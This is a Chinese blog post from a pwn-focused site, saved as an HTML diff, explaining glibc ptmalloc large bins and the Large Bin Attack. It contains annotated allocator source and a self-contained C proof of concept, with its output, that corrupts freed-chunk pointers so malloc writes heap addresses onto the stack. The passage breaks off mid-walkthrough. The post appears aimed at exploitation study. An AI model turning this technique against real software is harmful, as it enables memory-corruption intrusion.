@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Ptmalloc算法：Largebin AttackLarge Bin Attack 是一种较为困难的攻击方式，他对攻击的条件要求较多，实现也较为复杂，通常和 Unsorted Bin 打配合来实现 house of storm，来达到提升影响力的作用  libc-2.29 及以下版本，可以利用 Large Bin Attack 来写两个地址 libc-2.30 及以上版本中，只能利用 Large">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ptmalloc算法：Largebin Attack">
+<meta property="og:url" content="http://example.com/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="Ptmalloc算法：Largebin AttackLarge Bin Attack 是一种较为困难的攻击方式，他对攻击的条件要求较多，实现也较为复杂，通常和 Unsorted Bin 打配合来实现 house of storm，来达到提升影响力的作用  libc-2.29 及以下版本，可以利用 Large Bin Attack 来写两个地址 libc-2.30 及以上版本中，只能利用 Large">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-27T03:26:02.000Z">
+<meta property="article:modified_time" content="2022-04-28T04:30:37.051Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="ptmalloc">
+<meta property="article:tag" content="Largebin attack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Ptmalloc算法：Largebin Attack | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ptmalloc算法：Largebin Attack
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-27 11:26:02" itemprop="dateCreated datePublished" datetime="2022-03-27T11:26:02+08:00">2022-03-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-28 12:30:37" itemprop="dateModified" datetime="2022-04-28T12:30:37+08:00">2022-04-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Ptmalloc算法：Largebin-Attack"><a href="#Ptmalloc算法：Largebin-Attack" class="headerlink" title="Ptmalloc算法：Largebin Attack"></a>Ptmalloc算法：Largebin Attack</h2><p>Large Bin Attack 是一种较为困难的攻击方式，他对攻击的条件要求较多，实现也较为复杂，通常和 Unsorted Bin 打配合来实现 house of storm，来达到提升影响力的作用</p>
+<ul>
+<li>libc-2.29 及以下版本，可以利用 Large Bin Attack 来写两个地址</li>
+<li>libc-2.30 及以上版本中，只能利用 Large Bin Attack 来写一个地址</li>
+</ul>
+<h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><p>大于512（1024）字节的 chunk 称之为 large chunk，large bin 就是用于管理这些 large chunk 的</p>
+<p>largebin 采用双链表结构，里面的 chunk 从头结点的 fd 指针开始，按大小顺序进行排列 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这个结构中的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 来链接到下一个 size 的堆块头部和上一个 size 的堆块头部，然后在相同 size 的堆块内部再通过 <strong>fd</strong> 和 <strong>bk</strong> 来进行内部的管理</p>
+<ul>
+<li>用 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 链接的链表为横向链表，用 <strong>fd</strong> 和 <strong>bk</strong> 链接的链表为纵向链表</li>
+</ul>
+<p>在横向链表中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连</p>
+<p>largebin 基础知识：</p>
+<ul>
+<li>largebin 中一共包括 63 个 bin，index为64~126，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内</li>
+<li>largebin 的结构和其他链表都不相同，更加复杂</li>
+<li>largebin 里除了有 fd，bk 指针，另外还有 fd_nextsize 和 bk_nextsize 这两个指针</li>
+<li>largebin 的插入顺序不再是LIFO或FIFO，而是一种全新的方式</li>
+</ul>
+<p>largebin 特性：</p>
+<ul>
+<li>按照大小从大到小排序，若大小相同,按照 free 时间排序</li>
+<li>若干个大小相同的堆块，只有首堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 会指向其他堆块,后面的堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 均为 “0”</li>
+<li>size 最大的chunk的 <code>bk_nextsize</code> 指向最小的 chunk，size 最小的 chunk 的 <code>fd_nextsize</code> 指向最大的 chunk</li>
+</ul>
+<p>下面的代码将解释 largebin 的插入顺序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) <span class="comment">/* smallbin(暂时不管) */</span></span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);<span class="comment">//获取size对应的smallbin的index</span></span><br><span class="line">  bck = bin_at(av, victim_index);<span class="comment">//bck指向size对应的smallbin的链表头</span></span><br><span class="line">  <span class="comment">//fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span></span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* largebin(核心) */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    victim =&gt; 需要插入的目标chunk</span></span><br><span class="line"><span class="comment">    fwd =&gt; 最终为victim的上一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    bck =&gt; 最终为victim的下一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  victim_index = largebin_index(size); <span class="comment">/* 获取size对应的largebin的index */</span></span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    fwd =&gt; 最大的chunk(对应链表头中的第一个chunk)</span></span><br><span class="line"><span class="comment">    bck =&gt; 对应的largebin的链表头</span></span><br><span class="line"><span class="comment">    bck-&gt;fd =&gt; 对应largebin中最大的chunk(并且是第一个chunk)</span></span><br><span class="line"><span class="comment">    bck-&gt;bk =&gt; 对应largebin中最小的chunk(并且是最后一个chunk)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//如果largebin非空，在largbin进行按顺序插入</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">      <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">          <span class="comment">/* </span></span><br><span class="line"><span class="comment">          &quot;bck-&gt;bk&quot;指向对应largebin中最小的chunk</span></span><br><span class="line"><span class="comment">           如果&quot;size&quot;&lt;&quot;bck-&gt;bk-&gt;size&quot;，那么目标chunk将成为新的最小chunk</span></span><br><span class="line"><span class="comment">           因此需要把victim添加到此largebin的尾部</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          </span><br><span class="line">          fwd = bck; <span class="comment">/* fwd = 原链表头 */</span></span><br><span class="line">          bck = bck-&gt;bk; <span class="comment">/* bck = 原链表尾(最后一个chunk) */</span>    </span><br><span class="line">        </span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;最大chunk&quot; */</span></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;原最小chunk&quot; */</span></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;原最小chunk-&gt;fd_nextsize&quot; */</span></span><br><span class="line">          <span class="comment">/* 再把 &quot;victim&quot; 装入 &quot;最大chunk-&gt;bk_nextsize&quot; */</span></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> <span class="comment">/* 如果victim不是(不唯一是)largebin中最小的chunk */</span></span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">          <span class="comment">//从大到小（从头到尾）找到合适的位置</span></span><br><span class="line">          <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize; <span class="comment">/* 不断更新fwd,直到&quot;size&quot;&gt;=&quot;fwd-&gt;size&quot; */</span></span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">            </span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* 如果size刚好相等，就直接插入对应纵向列表的头部 */</span></span><br><span class="line">              fwd = fwd-&gt;fd; <span class="comment">/* fwd = 对应纵向列表的第一个chunk(跳过了头部) */</span></span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">/* 如果size不相等(&quot;size&quot;&gt;&quot;fwd-&gt;size&quot;)，就把victim加入到新的纵向链表 */</span></span><br><span class="line">              <span class="comment">/* fwd = 新纵向列表的头部 */</span></span><br><span class="line">              </span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;对应size小于victim的纵向链表&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;对应size大于victim的纵向链表&quot; */</span></span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(小于victim)-&gt;bk_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(大于victim)-&gt;fd_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk; <span class="comment">/* bck = 当前fwd的上一个chunk*/</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//如果largebin为空，将victim加入到纵向列表</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;victim-&gt;bk_nextsize&quot; */</span></span><br><span class="line">    <span class="comment">/* 再把 &quot;victim&quot; 装入 &quot;victim-&gt;fd_nextsize&quot; */</span></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index); <span class="comment">//把victim加入到的bin的表示为非空</span></span><br><span class="line"><span class="comment">//把victim加入到large bin的链表中</span></span><br><span class="line">victim-&gt;bk = bck; <span class="comment">/* bck = victim对应的下一个chunk */</span></span><br><span class="line">victim-&gt;fd = fwd; <span class="comment">/* fwd = victim对应的上一个chunk */</span></span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
+<p>发现以下规律：</p>
+<ul>
+<li>在纵向列表外部：对应的largebin从大到小组织各个纵向列表</li>
+<li>在纵向列表内部：新加入的chunk直接插头，而位于表头的chunk固定不变（除非其余成员全部被申请）</li>
+</ul>
+<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>LargeBin Attack 就发生在堆块中 UnsortedBin 放入 LargeBin 的过程当中去</p>
+<ul>
+<li>写入第一个地址：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+<p>如果我们对 victim-&gt;bk_nextsize 进行伪造，那么就可以控制程序写一个堆块地址到目标位置</p>
+<ul>
+<li>写入第二个地址：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
+<p>如果我们可以控制 fwd-&gt;bk 位置，那么就可以写一个堆块地址到目标位置</p>
+<p>下面就是利用案例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">/* 防止合并 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">/* long 在64位机器上时8字节 */</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./test </span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0x55ea64ab09a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0x55ea64ab09a0</span></span><br></pre></td></tr></table></figure>
+<p>可以发现：两个栈地址上被写入了数据，接下来就看看具体的执行过程</p>
+<p>“p1”和“p2”刚刚释放时：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a360</span> —▸ <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* p2 -&gt; p1 -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
+<p>不出意料的都放入了 unsortedbin ，接下来再进行申请时，ptmalloc就会根据“size”把目标chunk放入对应的bins中：</p>
